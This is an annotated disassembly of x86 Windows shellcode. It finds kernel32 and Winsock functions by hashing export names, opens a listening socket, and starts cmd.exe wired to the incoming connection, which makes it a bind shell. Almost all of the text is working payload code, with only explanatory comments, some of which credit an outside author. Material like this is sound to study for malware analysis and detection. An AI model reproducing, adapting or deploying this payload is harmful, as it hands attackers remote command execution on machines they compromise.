loc_4AF:                                ; CODE XREF: seg000:000004A8j
                sub     esp, 34h
                mov     esi, esp
                call    GetKernel32BaseAddy
                mov     [esi], eax      ; EAX is the base address of kernel32.dll
                push    dword ptr [esi]
                push    0EC0E4E8Eh      ; corresponds to LoadLibraryA
                call    ScanForAPI
                mov     [esi+8], eax
                push    dword ptr [esi]
                push    0CE05D9ADh      ; WaitForSingleObject
                call    ScanForAPI
                mov     [esi+0Ch], eax
                push    6C6Ch
                push    642E3233h
                push    5F327377h       ; ws32_2.dll
                push    esp
                call    dword ptr [esi+8]
                mov     [esi+4], eax    ; esi + 4 = HModule of ws32_2.dll
                push    dword ptr [esi]
                push    16B3FE72h       ; CreateProcessA
                call    ScanForAPI
                mov     [esi+10h], eax
                push    dword ptr [esi]
                push    73E2D87Eh       ; ExitProcess
                call    ScanForAPI
                mov     [esi+14h], eax
                push    dword ptr [esi+4]
                push    3BFCEDCBh       ; WSAStartup
                call    ScanForAPI
                mov     [esi+18h], eax
                push    dword ptr [esi+4]
                push    0ADF509D9h      ; WSASocketA
                call    ScanForAPI
                mov     [esi+1Ch], eax
                push    dword ptr [esi+4]
                push    0C7701AA4h      ; bind
                call    ScanForAPI
                mov     [esi+20h], eax
                push    dword ptr [esi+4]
                push    0E92EADA4h      ; listen
                call    ScanForAPI
                mov     [esi+24h], eax
                push    dword ptr [esi+4]
                push    498649E5h       ; accept
                call    ScanForAPI
                mov     [esi+28h], eax
                push    dword ptr [esi+4]
                push    79C679E7h       ; closesocket
                call    ScanForAPI
                mov     [esi+2Ch], eax
                xor     edi, edi
                sub     esp, 190h
                push    esp
                push    101h
                call    dword ptr [esi+18h] ; WSAStartup returns 0 if successful
                push    eax
                push    eax
                push    eax
                push    eax
                inc     eax
                push    eax
                inc     eax
                push    eax             ; call wsasocketa
                call    dword ptr [esi+1Ch] ; this code sequence is from halvar @ www.darklab.org/archive/msg00183.html
                mov     ebx, eax	
                push    edi
                push    edi
                push    5C110002h
                mov     ecx, esp
                push    16h
                push    ecx
                push    ebx
                call    dword ptr [esi+20h] ; bind
                push    edi
                push    ebx
                call    dword ptr [esi+24h] ; listen
                push    edi
                push    ecx
                push    ebx
                call    dword ptr [esi+28h] ; accept
                mov     edx, eax
                push    657865h         ; cmd.exe
                push    2E646D63h
                mov     [esi+30h], esp
                sub     esp, 54h
                lea     edi, [esp]
                xor     eax, eax
                xor     ecx, ecx
                add     ecx, 15h

loc_5C2:                                ; CODE XREF: seg000:000005C3j
                stosd
                loop    loc_5C2
                mov     byte ptr [esp+10h], 44h ; 'D'
                inc     byte ptr [esp+3Dh]
                mov     [esp+48h], edx
                mov     [esp+4Ch], edx
                mov     [esp+50h], edx
                lea     eax, [esp+10h]
                push    esp
                push    eax
                push    ecx
                push    ecx
                push    ecx
                push    1
                push    ecx
                push    ecx
                push    dword ptr [esi+30h]
                push    ecx
                call    dword ptr [esi+10h] ; CreateProcessA
                mov     ecx, esp
                push    0FFFFFFFFh
                push    dword ptr [ecx]
                call    dword ptr [esi+0Ch] ; waitforsingleobject
                mov     ecx, eax
                push    edi
                call    dword ptr [esi+2Ch] ; closesocket
                call    dword ptr [esi+14h] ; exitprocess


GetKernel32BaseAddy proc near           ; CODE XREF: seg000:000004B4p
                push    ebp		; see halvar's code for comments
                push    esi
                mov     eax, large fs:30h
                test    eax, eax
                js      short loc_618
                mov     eax, [eax+0Ch]
                mov     esi, [eax+1Ch]
                lodsd
                mov     ebp, [eax+8]
                jmp     short loc_621

loc_618:                                ; CODE XREF: GetKernel32BaseAddy+Aj
                mov     eax, [eax+34h]
                mov     ebp, [eax+0B8h]

loc_621:                                ; CODE XREF: GetKernel32BaseAddy+16j
                mov     eax, ebp
                pop     esi
                pop     ebp
                retn    4
GetKernel32BaseAddy endp


ScanForAPI      proc near               ; CODE XREF: seg000:000004C2p
                                        ; seg000:000004D1p ...

pattern         = dword ptr  14h
baseaddy        = dword ptr  18h

                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     ebp, [esp+baseaddy] ; get start of given DLL in memory
                mov     eax, [ebp+3Ch]  ; get start of PE header
                mov     edx, [ebp+eax+78h] ; get base of export table
                add     edx, ebp        ; edx = mem addy of export table
                mov     ecx, [edx+18h]  ; ecx = number of names
                mov     ebx, [edx+20h]  ; ebx = RVA of AddressOfNames
                add     ebx, ebp        ; ebx = mem addy of AddressOfNames

loc_641:                                ; CODE XREF: ScanForAPI+36j
                jecxz   short loc_675   ; if ECX = 0, couldn't find the 'string'
                dec     ecx             ; each time through the loop, ecx--
                mov     esi, [ebx+ecx*4] ; get RVA of first name
                add     esi, ebp        ; convert it into mem addy
                xor     edi, edi        ; clear EDI so it can assume its value
                cld                     ; direction = forwards

loc_64C:                                ; CODE XREF: ScanForAPI+30j
                xor     eax, eax
                lodsb                   ; load a byte of the API name from ESI
                cmp     al, ah          ; did we load a zero byte?
                jz      short loc_65A   ; yeah, we're done for this name
                ror     edi, 0Dh        ; nope, form the weirdo value in EDI
                add     edi, eax
                jmp     short loc_64C   ; restart

loc_65A:                                ; CODE XREF: ScanForAPI+29j
                cmp     edi, [esp+pattern] ; did the API name match what we wanted?
                jnz     short loc_641   ; nope, retry
                mov     ebx, [edx+24h]
                add     ebx, ebp        ; ebx = mem addy of AddressOfNameOrdinals
                mov     cx, [ebx+ecx*2] ; cx = ordinal of function
                mov     ebx, [edx+1Ch]
                add     ebx, ebp        ; ebx = mem addy of "AddressOfFunctions"
                mov     eax, [ebx+ecx*4] ; take EAX = RVA of ordinal #cx
                add     eax, ebp        ; eax becomes a mem addy
                jmp     short loc_677   ; done

loc_675:                                ; CODE XREF: ScanForAPI+19j
                xor     eax, eax        ; couldn't find it, so EAX=0

loc_677:                                ; CODE XREF: ScanForAPI+4Bj
                mov     edx, ebp        ; edx = base addy of DLL
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                retn    4               ; cleanup and return
ScanForAPI      endp
